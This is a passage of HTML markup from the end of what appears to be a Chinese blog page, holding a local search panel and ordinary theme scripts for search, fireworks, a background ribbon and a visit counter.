id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
